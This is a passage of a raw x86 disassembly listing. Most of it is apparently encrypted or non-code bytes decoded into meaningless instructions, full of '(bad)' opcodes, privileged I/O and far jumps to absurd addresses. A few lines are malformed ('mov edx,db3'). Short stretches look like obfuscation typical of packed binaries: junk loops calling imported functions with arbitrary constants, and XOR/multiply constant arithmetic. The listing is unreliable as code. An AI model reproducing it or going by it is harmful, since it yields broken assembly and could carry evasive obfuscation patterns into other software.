  4049b8:	xor    dh,BYTE PTR [eax-0x1d]
  4049bb:	dec    ebp
  4049bc:	cmp    ebp,eax
  4049be:	enter  0x57ae,0x88
  4049c2:	mov    dh,0x3b
  4049c4:	popf   
  4049c5:	or     edx,0x1b35e0e9
  4049cb:	jle    0x404981
  4049cd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4049ce:	out    0xca,al
  4049d0:	mov    dl,0xd8
  4049d2:	cmp    eax,0xf056e003
  4049d7:	adc    BYTE PTR [esi+0x42],ah
  4049da:	adc    BYTE PTR [edx],ch
  4049dc:	pop    esp
  4049dd:	outs   dx,DWORD PTR ds:[esi]
  4049de:	test   BYTE PTR [ecx+0x7bdeaf68],bh
  4049e4:	cmp    eax,0x598fe
  4049e9:	jns    0x40499c
  4049eb:	push   0x7a263d9a
  4049f0:	retf   0x88be
  4049f3:	sahf   
  4049f4:	mov    bl,BYTE PTR [esi-0x55]
  4049f7:	mov    bh,0xeb
  4049f9:	mov    eax,0x1a5c9377
  4049fe:	daa    
  4049ff:	mov    fs,ecx
  404a01:	cmp    dl,BYTE PTR [esi-0x74]
  404a04:	repz mov esp,0x81906c57
  404a0a:	xor    BYTE PTR [esi-0x63],ch
  404a0d:	dec    edi
  404a0e:	cli    
  404a0f:	jnp    0x404a59
  404a11:	xchg   edi,eax
  404a12:	xchg   edi,eax
  404a13:	imul   edi,ecx,0xffffffbe
  404a16:	mov    ch,0xcc
  404a18:	add    BYTE PTR [edx],al
  404a1a:	adc    BYTE PTR [esi+0x5b49c079],ah
  404a20:	jne    0x4049b8
  404a22:	out    0x15,eax
  404a24:	jno    0x404a99
  404a26:	iret   
  404a27:	push   ss
  404a28:	neg    ebx
  404a2a:	out    dx,al
  404a2b:	lea    ebx,[eax+edx*1]
  404a2e:	add    DWORD PTR [edi],edx
  404a30:	(bad)  
  404a31:	inc    ebx
  404a32:	xchg   DWORD PTR [ecx+0x5d957d87],edi
  404a38:	test   eax,0xc1979aae
  404a3d:	pop    ds
  404a3e:	push   0xfffffff8
  404a40:	rol    BYTE PTR ds:0x5e19f12,0x71
  404a47:	(bad)  
  404a48:	jmp    0xcf6c:0xc0232228
  404a4f:	mov    esp,0xe471b574
  404a54:	mov    dh,0xcf
  404a56:	xor    esp,DWORD PTR [esi-0x480de723]
  404a5c:	imul   ecx,DWORD PTR [ecx-0x86cbdf7],0x639107
  404a66:	outs   dx,DWORD PTR ds:[esi]
  404a67:	cli    
  404a68:	js     0x404ab2
  404a6a:	cmc    
  404a6b:	cmp    edi,DWORD PTR [eax-0xfa500ef]
  404a71:	rcl    DWORD PTR [eax],1
  404a73:	add    al,0xf
  404a75:	pop    esi
  404a76:	scas   al,BYTE PTR es:[edi]
  404a77:	or     DWORD PTR [ecx+0x3e34f514],ebp
  404a7d:	push   esp
  404a7e:	clc    
  404a7f:	add    al,0x96
  404a81:	mov    al,ds:0xffd3412c
  404a86:	test   DWORD PTR [ebx-0x46],0x1d29cee0
  404a8d:	and    eax,0x51d4ebc1
  404a92:	aad    0x1c
  404a94:	sahf   
  404a95:	push   esi
  404a96:	or     al,0x5
  404a98:	jmp    0x4fd2:0x75adb6e9
  404a9f:	jg     0x404a5b
  404aa1:	jmp    0x404a3a
  404aa3:	xchg   esi,eax
  404aa4:	add    eax,0xa842c8ed
  404aa9:	xlat   BYTE PTR ds:[ebx]
  404aaa:	fstp   QWORD PTR [ecx+0x23]
  404aad:	pop    edx
  404aae:	add    al,0x83
  404ab0:	(bad)  
  404ab1:	scas   eax,DWORD PTR es:[edi]
  404ab2:	sbb    DWORD PTR [eax+0x72],0xffffffe2
  404ab6:	stos   DWORD PTR es:[edi],eax
  404ab7:	adc    al,0x9a
  404ab9:	fidiv  WORD PTR [eax+0x73]
  404abc:	or     bl,BYTE PTR [eax+0x68d20cf2]
  404ac2:	retf   
  404ac3:	mov    al,ds:0x785c0c44
  404ac8:	mov    ecx,0x825f98b0
  404acd:	sub    bl,ch
  404acf:	lods   eax,DWORD PTR ds:[esi]
  404ad0:	rcr    BYTE PTR [ebp-0x35],1
  404ad3:	jmp    0x404b2b
  404ad5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404ad6:	jge    0x404b4f
  404ad8:	es call 0xe65bd417
  404ade:	sub    cl,BYTE PTR [edx]
  404ae0:	test   al,bl
  404ae2:	ins    DWORD PTR es:[edi],dx
  404ae3:	adc    BYTE PTR [edx+0x6dd7862d],cl
  404ae9:	into   
  404aea:	or     al,0xcc
  404aec:	daa    
  404aed:	pop    edi
  404aee:	inc    eax
  404aef:	xchg   edi,eax
  404af0:	fsub   st(3),st
  404af2:	inc    edx
  404af3:	push   cs
  404af4:	sub    BYTE PTR [eax+ebp*4],ch
  404af7:	add    dh,dh
  404af9:	shr    BYTE PTR [eax-0x43],0xbe
  404afd:	icebp  
  404afe:	mov    edx,0x5767dfdf
  404b03:	or     ah,BYTE PTR ds:0xfab6b9f4
  404b09:	arpl   WORD PTR [esi-0x5c51fc20],cx
  404b0f:	inc    edi
  404b10:	mov    edx,0xd9f6a3a
  404b15:	add    al,0x26
  404b17:	jbe    0x404b31
  404b19:	jmp    0x404b37
  404b1b:	cmp    cl,BYTE PTR [edx+eax*2]
  404b1e:	test   eax,0x5e7d71b0
  404b23:	(bad)  
  404b24:	addr16 (bad) 
  404b26:	mov    eax,ds:0x842da7ff
  404b2b:	push   edi
  404b2c:	xor    DWORD PTR [edi],eax
  404b2e:	cmp    BYTE PTR [edi+0x9],0x30
  404b32:	pop    esp
  404b33:	jp     0x404b3c
  404b35:	fdivr  DWORD PTR [ecx]
  404b37:	xor    ebx,DWORD PTR fs:[esi]
  404b3a:	or     DWORD PTR [edx-0x6bdf2795],edi
  404b40:	mov    bl,0x44
  404b42:	and    al,0x63
  404b44:	ins    BYTE PTR es:[edi],dx
  404b45:	shl    BYTE PTR [ebx-0x4d9c85dd],1
  404b4b:	mov    esi,0x6f727187
  404b50:	ficom  DWORD PTR [eax]
  404b52:	cmp    eax,0xf6c228b9
  404b57:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404b58:	repnz popa 
  404b5a:	push   edi
  404b5b:	xor    al,0xca
  404b5d:	xchg   ecx,eax
  404b5e:	ins    BYTE PTR es:[edi],dx
  404b5f:	cli    
  404b60:	cmp    al,0x43
  404b62:	xchg   edi,eax
  404b63:	iret   
  404b64:	adc    eax,0xff0e301f
  404b69:	das    
  404b6a:	xchg   ebx,eax
  404b6b:	pusha  
  404b6c:	mov    BYTE PTR [esi-0x595865a5],al
  404b72:	jge    0x404b4a
  404b74:	add    eax,0xac93e642
  404b79:	cs pop ds
  404b7b:	ret    0x5c3a
  404b7e:	(bad)  [esi-0x25b76076]
  404b84:	add    ebx,DWORD PTR [edi+0x3cef4d31]
  404b8a:	sub    edx,DWORD PTR ds:0x6be8e3a0
  404b90:	fucom  st(7)
  404b92:	pop    ebx
  404b93:	sub    bl,BYTE PTR [edx-0x7271f270]
  404b99:	fsubr  st(1),st
  404b9b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404b9c:	call   FWORD PTR [esi+0x2c]
  404b9f:	adc    BYTE PTR [edx-0x6a],al
  404ba2:	jp     0x404bdd
  404ba4:	(bad)  
  404ba5:	pop    eax
  404ba6:	pop    edx
  404ba7:	jp     0x404be5
  404ba9:	xchg   ebx,eax
  404baa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404bab:	scas   eax,DWORD PTR es:[edi]
  404bac:	sbb    ch,BYTE PTR [edi]
  404bae:	xor    DWORD PTR [esi],esi
  404bb0:	retf   0xca74
  404bb3:	mov    ah,0xab
  404bb5:	(bad)
  404bb8:	fs sbb bh,al
  404bbb:	mov    ebx,0xbdc8e7bf
  404bc0:	in     al,dx
  404bc1:	test   esp,eax
  404bc3:	cmp    BYTE PTR [edi-0x38dc3d0],ch
  404bc9:	or     esi,DWORD PTR [ebp-0x4e410a98]
  404bcf:	int    0xf2
  404bd1:	repz ja 0x404c0e
  404bd4:	data16 jmp 0x404c00
  404bd7:	sbb    edx,0x442c8168
  404bdd:	mov    dh,0x59
  404bdf:	ja     0x404c5b
  404be1:	adc    BYTE PTR [edx+0x4e1b8926],0x71
  404be8:	fsubr  DWORD PTR [edx]
  404bea:	retf   
  404beb:	(bad)  
  404bec:	adc    ebx,ebx
  404bee:	mov    DWORD PTR [esp-0x60f2fc04],eax
  404bf5:	ret    0xc6cf
  404bf8:	dec    edx
  404bf9:	lahf   
  404bfa:	xor    eax,0x8eff5c3e
  404bff:	pop    esp
  404c00:	daa    
  404c01:	mov    ah,0x3f
  404c03:	add    BYTE PTR [ebx+ecx*1],ah
  404c06:	das    
  404c07:	in     eax,dx
  404c08:	fnstenv [edi-0x79]
  404c0b:	cmp    DWORD PTR [ecx+ebp*4-0x55261d2e],0x7a478e63
  404c16:	cmp    al,0x86
  404c18:	push   ds
  404c19:	pushf  
  404c1a:	fsub   DWORD PTR [edx]
  404c1c:	adc    cl,bh
  404c1e:	test   BYTE PTR [edx],0x4a
  404c21:	jl     0x404bd5
  404c23:	dec    esi
  404c24:	fisubr WORD PTR [esi-0x63]
  404c27:	dec    edi
  404c28:	lds    edx,FWORD PTR [esi]
  404c2a:	xchg   DWORD PTR cs:[eax],ecx
  404c2d:	call   esi
  404c2f:	into   
  404c30:	push   ebp
  404c31:	in     eax,dx
  404c32:	out    0xe4,al
  404c34:	enter  0x7571,0xc9
  404c38:	jmp    0x404c41
  404c3a:	imul   edx,DWORD PTR [ecx-0x2a],0xffffff89
  404c3e:	mov    ebp,0xf48f6949
  404c43:	aaa    
  404c44:	or     ch,BYTE PTR [ecx]
  404c46:	xchg   ecx,eax
  404c48:	and    eax,0x62cacd26
  404c4d:	push   edi
  404c4e:	cmp    dh,BYTE PTR [eax+0x389e2f94]
  404c54:	test   DWORD PTR [ecx+0x25],ecx
  404c57:	retf   
  404c58:	inc    edx
  404c59:	(bad)  
  404c5a:	test   DWORD PTR [edi],0xf6d411a9
  404c60:	push   0xbd4b083f
  404c65:	inc    eax
  404c66:	xor    eax,0x6708fc9
  404c6b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404c6c:	js     0x404cec
  404c6e:	mov    cl,0x83
  404c70:	inc    edi
  404c71:	loope  0x404c09
  404c73:	pop    esp
  404c74:	push   cs
  404c75:	xor    DWORD PTR [esi-0x45],ecx
  404c78:	jbe    0x404ca2
  404c7a:	jmp    0x404c9b
  404c7c:	inc    esi
  404c7d:	pop    esp
  404c7e:	fisttp WORD PTR [edx]
  404c80:	cmp    eax,0x861e5a3e
  404c85:	inc    esi
  404c86:	call   0xf937:0x76d8e31e
  404c8d:	push   edi
  404c8e:	mov    WORD PTR [esi+0x46],es
  404c91:	inc    ecx
  404c92:	mov    DWORD PTR [ebp-0x29],esp
  404c95:	sahf   
  404c96:	sbb    al,0x17
  404c98:	sahf   
  404c99:	(bad)  
  404c9a:	cmp    eax,0x6475b568
  404c9f:	adc    DWORD PTR [edi],esp
  404ca1:	jp     0x404c54
  404ca3:	cmc    
  404ca4:	pop    ss
  404ca5:	push   ebp
  404ca6:	push   ebp
  404ca7:	je     0x404d0a
  404ca9:	mov    cl,0xb4
  404cab:	push   DWORD PTR [eax+edx*4]
  404cae:	xchg   esp,esp
  404cb0:	pop    ebx
  404cb1:	in     eax,0xae
  404cb3:	shr    DWORD PTR [edx-0x78],0x51
  404cb7:	and    al,0x79
  404cb9:	push   eax
  404cba:	mov    al,0x12
  404cbc:	sub    DWORD PTR [ebx],ecx
  404cbe:	mov    eax,0xbaa5c21d
  404cc3:	push   eax
  404cc4:	das    
  404cc5:	int3   
  404cc6:	sbb    edi,ecx
  404cc8:	pop    esp
  404cc9:	jmp    0x62b5:0xdf68bca7
  404cd0:	nop
  404cd1:	out    0x2c,al
  404cd3:	leave  
  404cd4:	aam    0x9c
  404cd6:	jle    0x404d3f
  404cd8:	sub    eax,0x21e1661d
  404cdd:	int    0x79
  404cdf:	shl    DWORD PTR [ebp-0x7eeac39a],1
  404ce5:	je     0x404d60
  404ce7:	mov    al,ah
  404ce9:	ins    BYTE PTR es:[edi],dx
  404cea:	shr    ch,0x13
  404ced:	loop   0x404d63
  404cef:	fldenv [eax+0x2a43a6d9]
  404cf5:	mov    WORD PTR [ebx],?
  404cf7:	ins    BYTE PTR es:[edi],dx
  404cf8:	mov    dl,0xee
  404cfa:	stc    
  404cfb:	jno    0x404cca
  404cfd:	mov    eax,DWORD PTR [ebp-0x14]
  404d00:	add    DWORD PTR [eax],0x705fa8c
  404d06:	mov    eax,DWORD PTR [ebp-0x10]
  404d09:	mov    edx,DWORD PTR [ebp+0x8]
  404d0c:	xor    eax,ecx
  404d0e:	lea    eax,[eax+edx*1+0x327299]
  404d15:	mov    DWORD PTR [ebp+0x8],eax
  404d18:	inc    DWORD PTR [ebp+0xc]
  404d1b:	jmp    0x4040d8
  404d20:	mov    eax,DWORD PTR [ebp-0x10]
  404d23:	xor    eax,ecx
  404d25:	mov    ecx,DWORD PTR [ebp+0x10]
  404d28:	add    eax,esi
  404d2a:	mov    DWORD PTR [ecx],eax
  404d2c:	pop    esi
  404d2d:	leave  
  404d2e:	ret    0xc
  404d31:	push   ebp
  404d32:	mov    ebp,esp
  404d34:	push   ecx
  404d35:	sub    edx,eax
  404d37:	jmp    0x404f34
  404d3c:	pop    edi
  404d3d:	mov    ebx,cs
  404d3f:	and    ebp,edi
  404d41:	jno    0x404dc0
  404d43:	dec    esp
  404d44:	call   0xbfaa7d7b
  404d49:	push   eax
  404d4a:	and    BYTE PTR [ebx],ch
  404d4c:	sbb    ebp,DWORD PTR [edi]
  404d4e:	jle    0x404dce
  404d50:	pop    esi
  404d51:	jg     0x404dd1
  404d53:	jle    0x404d50
  404d55:	inc    esp
  404d56:	outs   dx,DWORD PTR ds:[esi]
  404d57:	adc    eax,0xe78785d6
  404d5c:	(bad)  
  404d5d:	in     al,0x85
  404d5f:	test   eax,0x4c70e8d4
  404d64:	pop    ss
  404d65:	sti    
  404d66:	pop    es
  404d67:	pop    edi
  404d68:	and    eax,0x5b9c5ae0
  404d6d:	repz xchg ebx,eax
  404d6f:	mov    BYTE PTR [ebx+eiz*1],dl
  404d72:	cli    
  404d73:	push   cs
  404d74:	and    eax,0x59ee1e47
  404d79:	or     al,0xd8
  404d7b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404d7c:	and    BYTE PTR [edx-0xe],bh
  404d7f:	xlat   BYTE PTR ds:[ebx]
  404d80:	mov    bh,0x99
  404d82:	test   ch,cl
  404d84:	ret    
  404d85:	clc    
  404d86:	mov    ds:0xe12ff5b9,al
  404d8b:	inc    esp
  404d8c:	cdq    
  404d8d:	xor    eax,0xf4170224
  404d92:	add    BYTE PTR [ecx+0x1135a999],dh
  404d98:	scas   al,BYTE PTR es:[edi]
  404d99:	fsubr  st(7),st
  404d9b:	aam    0x74
  404d9d:	hlt    
  404d9e:	mov    bl,0x5
  404da0:	jecxz  0x404db8
  404da2:	cmp    al,0x2b
  404da4:	jmp    0x404db9
  404da6:	mov    dl,0xe8
  404da8:	in     eax,dx
  404da9:	pop    ebp
  404daa:	cmp    esi,DWORD PTR [edi]
  404dac:	sub    BYTE PTR [eax+0x6b],cl
  404daf:	push   esp
  404db0:	imul   edx,ebp,0x816ea158
  404db6:	pusha  
  404db7:	scas   al,BYTE PTR es:[edi]
  404db8:	cmp    DWORD PTR [edi],esp
  404dba:	(bad)  
  404dbb:	lods   eax,DWORD PTR ds:[esi]
  404dbc:	xor    DWORD PTR [esi+0x37e61559],esi
  404dc2:	mov    BYTE PTR [esi-0x7c],0x88
  404dc6:	das    
  404dc7:	lock and DWORD PTR [ecx],edi
  404dca:	and    eax,0xddd39388
  404dcf:	(bad)  
  404dd0:	mov    ah,0x7a
  404dd2:	mov    esp,0x742fa839
  404dd7:	mov    BYTE PTR [ecx+0x3e9a4995],al
  404ddd:	xor    al,0xc4
  404ddf:	clc    
  404de0:	mov    bl,0x84
  404de2:	idiv   DWORD PTR [ebp+0x51e5d9c1]
  404de8:	mov    BYTE PTR [edx+edi*8+0x43],ah
  404dec:	ins    DWORD PTR es:[edi],dx
  404ded:	pop    ss
  404dee:	sbb    BYTE PTR ds:0x10b25565,cl
  404df4:	jae    0x404e61
  404df6:	or     DWORD PTR [esp],eax
  404df9:	xchg   edx,eax
  404dfa:	fld    TBYTE PTR [ebp-0x3e]
  404dfd:	fcomp  st(0)
  404dff:	cmc    
  404e00:	dec    ecx
  404e01:	cmp    al,0x9d
  404e03:	aas    
  404e04:	jl     0x404e2e
  404e06:	dec    eax
  404e07:	mov    ebp,0xd9d32d7d
  404e0c:	scas   al,BYTE PTR es:[edi]
  404e0d:	sub    al,0xe5
  404e0f:	loope  0x404e21
  404e11:	in     al,0x4e
  404e13:	aaa    
  404e14:	iret   
  404e15:	arpl   WORD PTR [ebx-0x54],bx
  404e18:	inc    ecx
  404e19:	aas    
  404e1a:	test   DWORD PTR [edi-0x65],ecx
  404e1d:	jge    0x404e29
  404e1f:	loope  0x404e24
  404e21:	jg     0x404e0a
  404e23:	jp     0x404e8d
  404e25:	mul    DWORD PTR [edx]
  404e27:	pop    edi
  404e28:	xlat   BYTE PTR ds:[ebx]
  404e29:	cli    
  404e2a:	bound  edi,QWORD PTR [ebp+ecx*1-0x4b]
  404e2e:	std    
  404e2f:	arpl   WORD PTR [eax+eiz*1],bx
  404e32:	mov    edi,0xaec5f757
  404e37:	xchg   edi,eax
  404e38:	inc    eax
  404e39:	mov    al,ds:0xa07b7686
  404e3e:	fs push edx
  404e40:	jge    0x404e30
  404e42:	pop    edx
  404e43:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404e44:	neg    DWORD PTR [ebx]
  404e46:	mov    edx,db3
  404e49:	ja     0x404df9
  404e4b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404e4c:	(bad)  
  404e4d:	mov    esp,0xae1d89b6
  404e52:	fucom  st(7)
  404e54:	add    eax,0xc2c10812
  404e59:	add    bl,BYTE PTR [edi]
  404e5b:	sbb    eax,0x1a9f7de2
  404e60:	shr    BYTE PTR [ebp-0x7ddcfc76],0xbb
  404e67:	imul   DWORD PTR [ebx]
  404e69:	js     0x404df3
  404e6b:	nop
  404e6c:	stc    
  404e6d:	sub    DWORD PTR [edi],0x38
  404e70:	mov    esi,0xc729783d
  404e75:	push   ebx
  404e76:	loope  0x404eed
  404e78:	clc    
  404e79:	retf   
  404e7a:	pop    eax
  404e7b:	and    al,0x88
  404e7d:	adc    ebp,eax
  404e7f:	fnstcw WORD PTR [esp+edi*8-0x71]
  404e83:	mov    al,0x48
  404e85:	ss xor eax,0x222ffc9f
  404e8b:	dec    ebp
  404e8c:	inc    edx
  404e8d:	lods   eax,DWORD PTR ds:[esi]
  404e8e:	add    eax,0xae249230
  404e93:	mov    bl,0xab
  404e95:	ret    0x870c
  404e98:	aam    0x4e
  404e9a:	or     eax,0x12567532
  404e9f:	enter  0xe8cf,0xe9
  404ea3:	jmp    0x14a875e5
  404ea8:	fldenv [ecx-0x22]
  404eab:	mov    eax,0x920e0ade
  404eb0:	sub    eax,0x68679dd2
  404eb5:	jge    0x404e89
  404eb7:	or     al,0x4
  404eb9:	ror    DWORD PTR [ecx],1
  404ebb:	add    bl,BYTE PTR [edx+0x34ae038a]
  404ec1:	leave  
  404ec2:	repnz mov eax,ds:0x568868bf
  404ec8:	jne    0x404f36
  404eca:	ficomp DWORD PTR [edi+0x3b97b4cf]
  404ed0:	pop    ebp
  404ed1:	shr    bl,0xc9
  404ed4:	xchg   ebx,eax
  404ed5:	test   al,0x88
  404ed7:	mov    al,ds:0xb8f3bfa4
  404edc:	stc    
  404edd:	xor    BYTE PTR [esi-0x56],cl
  404ee0:	jle    0x404ebd
  404ee2:	leave  
  404ee3:	lods   al,BYTE PTR ds:[esi]
  404ee4:	pop    edi
  404ee5:	inc    ecx
  404ee6:	adc    DWORD PTR [ebx],edi
  404ee8:	xor    esi,DWORD PTR [ecx+0x26]
  404eeb:	mov    bh,0xcf
  404eed:	xchg   esi,eax
  404eee:	mov    al,ds:0x2c26dc63
  404ef3:	loop   0x404f2c
  404ef5:	repnz add DWORD PTR [esi],0xfffffffa
  404ef9:	imul   eax,DWORD PTR [eax],0x881fb62d
  404eff:	mov    WORD PTR [esi],cs
  404f01:	popa   
  404f02:	jnp    0x404f49
  404f04:	inc    ebx
  404f05:	data16 jno 0x404efd
  404f08:	sbb    ebx,DWORD PTR [ecx+0x26b73255]
  404f0e:	es aaa 
  404f10:	je     0x404ee2
  404f12:	xchg   DWORD PTR ss:[edx+0xd384c13],ebp
  404f19:	sub    BYTE PTR [eax+ebp*8],0x7b
  404f1d:	mov    esp,0xddf24577
  404f22:	loope  0x404eca
  404f24:	or     DWORD PTR [eax],ebx
  404f26:	in     eax,dx
  404f27:	(bad)  
  404f29:	ret    
  404f2a:	dec    edx
  404f2b:	lds    edx,FWORD PTR [ebp-0x8]
  404f2e:	in     eax,0x8b
  404f30:	pop    ds
  404f31:	xchg   ebp,eax
  404f32:	jg     0x404fb1
  404f34:	push   ecx
  404f35:	or     edx,DWORD PTR ds:0x43457b
  404f3b:	mov    DWORD PTR [ebp-0x8],0xf89c8536
  404f42:	mov    DWORD PTR ds:0x43460b,0x1c
  404f4c:	cmp    DWORD PTR ds:0x43460b,0x0
  404f53:	je     0x404f94
  404f59:	cmp    DWORD PTR ds:0x43460b,0x21
  404f60:	jne    0x404f84
  404f66:	push   DWORD PTR [ebp-0x24]
  404f69:	push   DWORD PTR [ebp-0x20]
  404f6c:	push   0x26f9
  404f71:	push   0x3d74
  404f76:	push   0x4b4e
  404f7b:	push   DWORD PTR [ebp-0x1c]
  404f7e:	call   DWORD PTR ds:0x413280
  404f84:	mov    eax,ds:0x43460b
  404f89:	dec    eax
  404f8a:	mov    ds:0x43460b,eax
  404f8f:	jmp    0x404f4c
  404f94:	mov    DWORD PTR [ebp-0x4],0xf89c8539
  404f9b:	mov    eax,DWORD PTR [ebp-0x4]
  404f9e:	xor    DWORD PTR ds:0x434573,ecx
  404fa4:	push   esi
  404fa5:	and    DWORD PTR ds:0x434613,0x0
  404faf:	mov    edx,DWORD PTR ds:0x434613
  404fb5:	inc    edx
  404fb6:	mov    DWORD PTR ds:0x434613,edx
  404fbc:	cmp    DWORD PTR ds:0x434613,0x21
  404fc3:	jne    0x404fe1
  404fc9:	push   0x4347c9
  404fce:	push   0x43474e
  404fd3:	push   0x6321
  404fd8:	push   DWORD PTR [ebp-0x10]
  404fdb:	call   DWORD PTR ds:0x4130bc
  404fe1:	cmp    DWORD PTR ds:0x434613,0x19
  404fe8:	jb     0x404faf
  404fee:	inc    ecx
  404fef:	mov    esi,DWORD PTR [ebp-0x8]
  404ff2:	inc    DWORD PTR ds:0x4345b7
  404ff8:	mov    edx,0x7510851
  404ffd:	xor    eax,edx
  404fff:	xor    esi,edx
  405001:	mov    ecx,0x327299
  405006:	add    esi,ecx
  405008:	xor    DWORD PTR ds:0x4345b7,0x55d1
  405012:	add    eax,ecx
  405014:	imul   eax,esi
  405017:	mov    esi,DWORD PTR [ebp+0xc]
  40501a:	cmp    esi,eax
  40501c:	jne    0x405038
  405022:	mov    eax,DWORD PTR [ebp-0x4]
  405025:	mov    esi,DWORD PTR [ebp-0x8]
  405028:	xor    eax,edx
  40502a:	xor    esi,edx
  40502c:	add    eax,ecx
  40502e:	add    esi,ecx
  405030:	imul   eax,esi
  405033:	jmp    0x405270
  405038:	mov    eax,DWORD PTR [ebp+0xc]
  40503b:	mov    eax,DWORD PTR [eax+0x78]
  40503e:	jmp    0x40523b
  405043:	imul   esp,DWORD PTR [eax],0x7d571dbe
  405049:	jge    0x4050b7
  40504b:	push   esp
  40504c:	pop    ds
  40504d:	loopne 0x40508f
  40504f:	lea    ebp,[ebp+esi*8+0x7e297be7]
  405056:	jle    0x4050b6
  405058:	jg     0x4050d8
  40505a:	jle    0x405012
  40505c:	xor    DWORD PTR [edi],ebp
  40505e:	jb     0x405090
  405060:	mov    ds:0xde263564,al
  405065:	jecxz  0x405093
  405067:	es daa 
  405069:	push   es
  40506a:	mov    ecx,0x8f4d76c2
  40506f:	loop   0x4050c0
  405071:	arpl   WORD PTR [edx+0x27cd14d9],sp
  405077:	xchg   edx,eax
  405078:	mov    cl,0xc7
  40507a:	and    DWORD PTR [ebp-0x41198343],0x6b
  405081:	and    DWORD PTR [edx],esp
  405083:	adc    al,0xd3
  405085:	test   al,0xc7
  405087:	sub    eax,0xa38f1e06
  40508c:	retf   
  40508d:	mov    bh,0xbe
  40508f:	xchg   edx,eax
  405090:	fdiv   QWORD PTR [ebx-0xc0592c3]
  405096:	sbb    DWORD PTR [esi+0x6f],ecx
  405099:	xchg   ebp,eax
  40509a:	pop    eax
  40509b:	nop
  40509c:	mov    ebp,cs
  40509e:	jbe    0x40510c
  4050a0:	daa    
  4050a1:	or     eax,0xf3d84fc4
  4050a6:	sbb    BYTE PTR [ebx],dh
  4050a8:	pushf  
  4050a9:	repz jl 0x4050f5
  4050ac:	push   0xccaa19fe
  4050b1:	jl     0x405033
  4050b3:	in     eax,0x9f
  4050b5:	(bad)  
  4050b6:	sub    al,BYTE PTR [esi]
  4050b8:	fiadd  DWORD PTR [ecx-0x744c3019]
  4050be:	pop    ebp
  4050bf:	je     0x40506c
  4050c1:	cli    
  4050c2:	fimul  WORD PTR [ebx]
  4050c4:	mov    edx,0x4ad0248c
  4050c9:	jns    0x4050d5
  4050cb:	dec    edi
  4050cc:	add    ecx,DWORD PTR ds:0xc280b05e
  4050d2:	pop    ecx
  4050d3:	inc    ecx
  4050d4:	lahf   
  4050d5:	cmp    BYTE PTR [edx],dl
  4050d7:	add    cl,BYTE PTR [ebx-0x7f0c6948]
  4050dd:	popa   
  4050de:	xchg   esp,eax
  4050df:	sub    eax,0x6f175e2
  4050e4:	dec    esp
  4050e5:	pop    edi
  4050e6:	lds    ecx,FWORD PTR [ecx]
  4050e8:	xchg   ecx,eax
  4050e9:	das    
  4050ea:	aad    0x11
  4050ec:	cmp    DWORD PTR [ecx-0x63d07e3d],esp
  4050f2:	cmp    dl,ah
  4050f4:	xchg   ax,ax
  4050f6:	inc    ecx
  4050f7:	sbb    BYTE PTR gs:[ecx+0x3ea9076b],ah
  4050fe:	(bad)  
  4050ff:	fsubr  DWORD PTR [ecx-0x6b3e6372]
  405105:	jmp    0x405171
  405107:	mov    esp,0x4d850493
  40510c:	adc    dl,BYTE PTR [edx+eiz*2]
  40510f:	pop    edx
  405110:	ror    edi,0x5d
  405113:	pop    es
  405114:	mov    edi,0x6b65f8fc
  405119:	cmp    DWORD PTR [ebp+0x6690e431],eax
  40511f:	mov    ebp,0x8c5640a3
  405124:	retf   0xa5fd
  405127:	in     al,0x5e
  405129:	sub    BYTE PTR [esi],bl
  40512b:	mov    BYTE PTR [edx+0x44f88b0d],ch
  405131:	das    
  405132:	cmp    BYTE PTR [ebx+0x61],ah
  405135:	aad    0x7
  405137:	imul   ch
  405139:	stos   BYTE PTR es:[edi],al
  40513a:	scas   eax,DWORD PTR es:[edi]
  40513b:	cli    
  40513c:	xlat   BYTE PTR ds:[ebx]
  40513d:	push   edx
  40513e:	lods   al,BYTE PTR ds:[esi]
  40513f:	push   0xd4158a1
  405144:	xor    bh,cl
  405146:	(bad)  
  405147:	in     al,dx
  405148:	add    bl,BYTE PTR [eax]
  40514a:	shr    DWORD PTR [eax],0x29
  40514d:	lea    esi,[edi-0x7b17f5a5]
  405153:	call   0x5502:0x7ecf5802
  40515a:	psubq  mm0,QWORD PTR [esi]
  40515d:	mov    edx,0x631b2c6d
  405162:	xchg   esp,eax
  405163:	out    0x41,eax
  405165:	int3   
  405166:	lahf   
  405167:	xchg   esi,eax
  405168:	dec    edx
  405169:	imul   BYTE PTR [edx+0x40]
  40516c:	adc    eax,0xe0efdc4f
  405171:	jp     0x405157
  405173:	and    dl,bh
  405175:	push   ds
  405176:	adc    eax,0x214a3e5
  40517b:	mov    eax,0x46b714cb
  405180:	add    al,0xff
  405182:	or     dl,BYTE PTR [esi-0x30]
  405185:	imul   edi,DWORD PTR [eax-0x7ab1b25],0x57
  40518c:	loope  0x405184
  40518e:	test   eax,0xd9b68a53
  405193:	ret    0x3ef0
  405196:	sbb    dh,ah
  405198:	(bad)  
  405199:	lea    esi,[ebx+0x19b76cd]
  40519f:	dec    edx
  4051a0:	mov    dh,0xdd
  4051a2:	mov    ss,WORD PTR [ebx]
  4051a4:	repz cld 
  4051a6:	mov    cs,WORD PTR [edi+0x4f52b2a4]
  4051ac:	jmp    DWORD PTR [ecx-0x6744fec]
  4051b2:	push   esi
  4051b3:	int    0x82
  4051b5:	jbe    0x40519e
  4051b7:	sar    DWORD PTR [esi+0x73],1
  4051ba:	clc    
  4051bb:	loopne 0x405152
  4051bd:	add    eax,0x3e58c622
  4051c2:	mov    esp,DWORD PTR [eax+0xeb59138]
  4051c8:	call   DWORD PTR [edi-0x117418d1]
  4051ce:	xor    DWORD PTR [edi+0x62cf26dd],edi
  4051d4:	dec    esp
  4051d5:	loopne 0x40516d
  4051d7:	mov    BYTE PTR [ebx],dl
  4051d9:	jmp    0x10361afd
  4051de:	cwd    
  4051e0:	jg     0x405234
  4051e2:	fisubr DWORD PTR [edx-0x40]
  4051e5:	or     ebx,0xffffffc9
  4051e8:	(bad)  
  4051e9:	cmc    
  4051ea:	repnz or edx,esi
  4051ed:	in     eax,0xac
  4051ef:	pushf  
  4051f0:	or     ebx,DWORD PTR [eax]
  4051f2:	mov    ss,WORD PTR [ebp+ecx*2-0x13]
  4051f6:	or     dl,al
